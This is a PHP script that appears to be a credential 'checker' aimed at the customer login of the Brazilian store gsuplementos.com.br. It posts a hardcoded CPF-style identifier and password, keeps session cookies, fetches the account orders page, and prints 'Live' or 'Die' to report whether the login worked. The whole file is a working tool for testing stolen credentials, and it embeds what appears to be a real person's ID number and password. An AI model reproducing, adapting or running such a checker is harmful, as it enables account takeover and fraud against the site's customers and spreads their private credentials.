<?php
error_reporting(0);
if (file_exists("cookie.txt")!== false) {unlink("cookie.txt");fopen
  ("cookie.txt", 'w+');fclose
  ("cookie.txt");}else{fopen
  ("cookie.txt", 'w+');fclose
  ("cookie.txt");}


function request($url, $method){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE , getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPHEADER, array());
curl_setopt($ch, CURLOPT_POSTFIELDS, $method);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
return curl_exec($ch);
}

request("https://www.gsuplementos.com.br/checkout/acesso", "");
request("https://www.gsuplementos.com.br/checkout/ajax/ajax-checkout-acesso.php", "email=004.762.845-62&senha=");
request("https://www.gsuplementos.com.br/checkout/ajax/ajax-checkout-acesso.php", "email=&senha=%40Mamaefoca23");
$p1 = request("https://www.gsuplementos.com.br/minha-conta/pedido", "");


if (strpos($p1, 'menuConta-sairTxt')) {
    echo "Live";
}else{
    echo "Die";
}